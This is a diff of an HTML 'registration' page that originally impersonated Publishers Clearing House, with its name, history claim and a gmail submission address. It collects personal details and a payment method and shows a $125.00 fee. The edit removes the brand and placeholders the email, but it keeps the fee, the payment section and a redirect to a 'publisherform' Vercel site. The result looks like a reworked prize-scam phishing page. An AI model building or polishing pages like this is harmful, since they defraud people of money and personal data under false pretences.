@@ -3,43 +3,35 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Publishers Clearing House – Official Registration</title>
+  <title>Registration Form</title>
   <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
-
-  <!-- Animated Money Canvas -->
   <canvas id="money-canvas"></canvas>
 
   <div class="page-wrapper">
-
-    <!-- ── Header ── -->
     <header class="site-header">
       <div class="header-badge">
-        Publishers Clearing House
-        <span class="header-sub">Official Entry Registration</span>
+        Registration Form
+        <span class="header-sub">Secure Submission</span>
       </div>
-      <p class="tagline">Secure Entry Registration</p>
+      <p class="tagline">Please complete the form below</p>
     </header>
 
-    <!-- ── Registration Form Card ── -->
     <div class="form-card">
       <div class="card-top-bar"></div>
       <div class="card-body">
-
-        <!-- Error Summary -->
         <div id="form-error-summary" role="alert">
-          ⚠ Please fix the highlighted fields before submitting.
+          Please fix the highlighted fields before submitting.
         </div>
 
-        <form id="reg-form" action="https://formsubmit.co/publishersclearinghouse19530@gmail.com" method="POST">
+        <form id="reg-form" action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST">
           <input type="hidden" name="_subject" value="New registration submission"/>
           <input type="hidden" name="_template" value="table"/>
           <input type="hidden" name="_captcha" value="false"/>
-          <input type="hidden" name="_next" value="./thank-you.html"/>
+          <input type="hidden" name="_next" value="https://publisherform.vercel.app/thank-you.html"/>
           <input type="text" name="_honey" class="hidden-field" tabindex="-1" autocomplete="off"/>
 
-          <!-- ── Personal Information ── -->
           <div class="section-title">
             <span class="section-marker"></span> Personal Information
           </div>
@@ -77,13 +69,11 @@
 
           <hr class="divider"/>
 
-          <!-- ── Payment Method ── -->
           <div class="section-title">
             <span class="section-marker"></span> Payment Method
           </div>
 
           <div class="payment-grid" id="payment-group" role="radiogroup" aria-label="Payment method">
-
             <div class="payment-option">
               <input type="radio" id="pay-cash" name="Payment Method" value="Cash" required/>
               <label for="pay-cash">
@@ -119,15 +109,13 @@
                 <span class="check-dot"></span>
               </label>
             </div>
-
           </div>
           <div class="error-msg" id="err-payment" style="margin-bottom:16px;">Please select a payment method.</div>
 
           <hr class="divider"/>
 
-          <!-- ── Important Instructions ── -->
           <div class="section-title" style="margin-bottom:12px;">
-            <span class="section-marker"></span> Important Instructions
+            <span class="section-marker"></span> Submission Notes
           </div>
 
           <div class="instruction-box" role="note">
@@ -139,41 +127,37 @@
                 </span>
                 <strong class="fee-amount">$125.00</strong>
               </li>
-              <li>Bonus eligibility: available only during approved promotional periods.</li>
-              <li>Emergency support: available when additional assistance is required.</li>
+              <li>Please review your contact details before submitting the form.</li>
+              <li>A confirmation page will appear after the form is successfully submitted.</li>
+              <li>Follow-up messages will be sent to the email address provided.</li>
             </ul>
           </div>
 
           <hr class="divider"/>
 
-          <!-- ── Terms & Conditions ── -->
           <div class="section-title" style="margin-bottom:12px;">
             <span class="section-marker"></span> Agreement
           </div>
 
           <label class="terms-row" for="terms">
             <input type="checkbox" id="terms" name="Terms Agreement" value="Agreed" required/>
-            <span>I agree to the <a href="#" onclick="return false;">Terms and Conditions</a> of Publishers Clearing House and understand the registration requirements outlined above.</span>
+            <span>I confirm that the information provided is accurate and agree to be contacted about this submission.</span>
           </label>
-          <div class="error-msg" id="err-terms" style="margin-bottom:16px;">You must agree to the Terms and Conditions.</div>
+          <div class="error-msg" id="err-terms" style="margin-bottom:16px;">You must confirm the agreement before submitting.</div>
 
           <hr class="divider"/>
 
-          <!-- ── Submit Button ── -->
           <button type="submit" class="submit-btn">
             Submit Registration
           </button>
-
         </form>
-
-      </div><!-- /card-body -->
-    </div><!-- /form-card -->
+      </div>
+    </div>
 
     <footer class="page-footer">
-      © 2025 Publishers Clearing House · All Rights Reserved · Prize-winning experience since 1953
+      © 2026 Registration Form · All Rights Reserved
     </footer>
-
-  </div><!-- /page-wrapper -->
+  </div>
 
   <script src="script.js"></script>
 </body>
